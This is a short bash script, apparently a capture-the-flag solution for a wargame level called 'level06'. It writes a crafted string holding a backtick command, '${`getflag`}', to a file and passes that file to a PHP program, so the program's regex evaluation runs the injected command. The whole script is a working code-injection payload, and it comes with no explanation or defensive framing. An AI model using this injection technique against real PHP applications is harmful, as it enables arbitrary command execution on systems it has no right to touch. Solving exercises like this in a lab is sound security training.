#!/bin/bash

# 1. Create the getflag file containing the string for regex
echo '[x ${`getflag`}]' > /tmp/flag06

# 2. Execute the PHP script, so it executes our injected getflag
./level06 /tmp/flag06